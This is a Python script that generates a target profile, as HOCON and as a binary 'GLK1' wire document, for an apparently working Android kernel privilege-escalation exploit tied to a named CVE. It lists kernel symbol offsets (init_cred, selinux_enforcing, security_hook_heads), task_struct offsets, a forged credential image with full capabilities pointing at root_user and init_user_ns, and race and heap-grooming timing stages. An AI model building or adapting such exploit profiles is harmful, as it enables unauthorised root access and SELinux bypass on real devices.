"""Build the NTH-AN00 profile as HOCON (for the app import) and as a GLK1 v2
wire document (for direct --ghostlock-app-call testing)."""

import struct

MAGIC = 0x0D000721
VERSION = 2
FRONTEND_ROOT_CHILD = 1
BACKEND_CVE_2026_43499 = 1
ROUTE_MULTICAST = 3

RELEASE = "5.4.289-qgki-g8f2019ef68d9"

OFF = {
    "init_task": 0x02A04200,
    "init_cred": 0x02A0F5E0,
    "empty_zero_page": 0x02C0F000,
    "root_task_group": 0x02C22480,
    "selinux_enforcing": 0x02C0E001,
    "selinux_blob_sizes": 0x022F2EEC,
    "security_hook_heads": 0x022F2870,
    "slide_nfulnl_logger": 0x0290AB00,
    "slide_loggers_0_1": 0x02914C10,
    "slide_boot_id": 0x02D74BF9,
}

TASK = {
    "prio": 0x11C,
    "normal_prio": 0x124,
    "sched_task_group": 0x438,
    "pi_lock": 0x96C,
    "pi_waiters": 0x978,
    "pi_top_task": 0x988,
    "pi_blocked_on": 0x990,
    "pid": 0x6C0,
    "tgid": 0x6C4,
    "atomic_flags": 0x690,
    "real_cred": 0x878,
    "cred": 0x880,
    "comm": 0x890,
    "tasks": 0x5C8,
    "seccomp": 0x948,
}

CRED_IMAGES = {
    "ref0_image": 0xFFFFFFC012A8E7F0,  # root_user
    "ref1_image": 0xFFFFFFC012A8E5D0,  # init_user_ns
    "ref2_image": 0xFFFFFFC012A8F5D8,  # init_groups
}

EXEC = {
    "execution.recommended_cpus": {"main": 0, "consumer": 1},
    "execution.heap": {
        "prepare_max_attempts": 8,
        "prepare_timeout_ms": 240000,
        "kernelsnitch_timeout_ms": 60000,
    },
    "execution.race": {
        "route_wait_ms": 1000,
        "route_done_timeout_ms": 300000,
        "setup_settle_us": 50000,
        "state_poll_interval_us": 1000,
    },
    "execution.stages": {
        "w1_attempts": 15,
        "w1_settle_us": 100000,
        "w1_scratch_repair_attempts": 3,
        "w2_attempts": 15,
        "w2_settle_us": 100000,
        "w3_chain_rounds": 3,
        "w3_attempts": 6,
        "w3_settle_us": 50000,
    },
    "execution.handoff": {
        "pre_dispatch_settle_ms": 60000,
        "module_poll_attempts": 30,
        "module_poll_interval_ms": 100,
        "enforce_poll_attempts": 200,
        "enforce_poll_interval_ms": 100,
    },
    "execution.consumer": {"max_calls": 1, "burst_calls": 1},
    "route.multicast_waiter": {
        "waiter_off": 192,
        "buffer_size": 264,
        "task_offset": 48,
        "lock_offset": 56,
    },
}


def signed64(value: int) -> int:
    return value - (1 << 64) if value >= (1 << 63) else value


def sections():
    meta = {"kernel_major": 5, "recommend_shizuku": 1, "fallback_route": 0, "safe_mode": 0}
    cred = {
        "copy_size": 168,
        "usage_offset": 0,
        "usage_value": 1,
        "caps_offset": 40,
        "caps_count": 5,
        "caps_value": 0x3FFFFFFFFF,
        "ref_count": 3,
        "ref0_offset": 128,
        "ref1_offset": 136,
        "ref2_offset": 144,
        "ref3_offset": 0,
        "ref0_image": signed64(CRED_IMAGES["ref0_image"]),
        "ref1_image": signed64(CRED_IMAGES["ref1_image"]),
        "ref2_image": signed64(CRED_IMAGES["ref2_image"]),
        "ref3_image": 0,
    }
    kernel = {
        "kernel_phys_load": 0x128000000,
        "kernel_phys_offset": 0x80000000,
        "compact_waiter": 1,
        "kernelsnitch_collisions": 4,
        "mm_struct_sz": 960,
    }
    out = [
        ("meta", meta),
        ("task_struct", TASK),
        ("cred", cred),
        ("offset", OFF),
        ("kernel", kernel),
    ]
    for name, values in EXEC.items():
        out.append((name, values))
    return out


def encode_glk1() -> bytes:
    body = bytearray()
    body += struct.pack("<I", MAGIC)
    body += struct.pack("<H", VERSION)
    body += struct.pack("<H", FRONTEND_ROOT_CHILD)
    body += struct.pack("<H", BACKEND_CVE_2026_43499)
    body += struct.pack("<H", ROUTE_MULTICAST)
    body += struct.pack("<H", len(RELEASE))
    body += b"\x00\x00"  # kHeaderSize is 16: two pad bytes after release_len
    body += RELEASE.encode()

    secs = sections()
    body += struct.pack("<H", len(secs))
    for name, values in secs:
        nb = name.encode()
        body += struct.pack("<B", len(nb)) + nb
        items = [(k, v) for k, v in values.items()]
        body += struct.pack("<I", len(items))
        for key, value in items:
            kb = key.encode()
            body += struct.pack("<B", len(kb)) + kb
            body += struct.pack("<Q", value & 0xFFFFFFFFFFFFFFFF)
    return bytes(body)


def encode_conf() -> str:
    lines = [f'release = "{RELEASE}"', "schema_version = 1", "kernel_major = 5",
             "kernel_phys_load = %d" % 0x128000000,
             "kernel_phys_offset = %d" % 0x80000000,
             "recommend_shizuku = 1",
             "fallback {", '  to = "none"', "}", ""]
    for name, values in sections():
        head = name.split(".")[-1]
        lines.append(f"{head} {{")
        for key, value in values.items():
            lines.append(f"  {key} = {value}")
        lines.append("}")
        lines.append("")
    lines.append("route {")
    lines.append("  multicast_waiter {")
    for key, value in EXEC["route.multicast_waiter"].items():
        lines.append(f"    {key} = {value}")
    lines.append("  }")
    lines.append("}")
    lines.append("")
    lines.append("execution {")
    for key, value in EXEC["execution.stages"].items():
        lines.append(f"  stages {{ {key} = {value} }}")
        break
    lines.append("  stages {")
    for key, value in EXEC["execution.stages"].items():
        lines.append(f"    {key} = {value}")
    lines.append("  }")
    lines.append("  handoff {")
    for key, value in EXEC["execution.handoff"].items():
        lines.append(f"    {key} = {value}")
    lines.append("  }")
    lines.append("}")
    return "\n".join(lines) + "\n"


if __name__ == "__main__":
    import pathlib

    here = pathlib.Path(__file__).parent
    (here / "nth-profile.glk1").write_bytes(encode_glk1())
    (here / "nth-profile.conf").write_text(encode_conf(), encoding="utf-8")
    print("glk1 bytes:", (here / "nth-profile.glk1").stat().st_size)
    for name, values in sections():
        print(name, len(values), values)
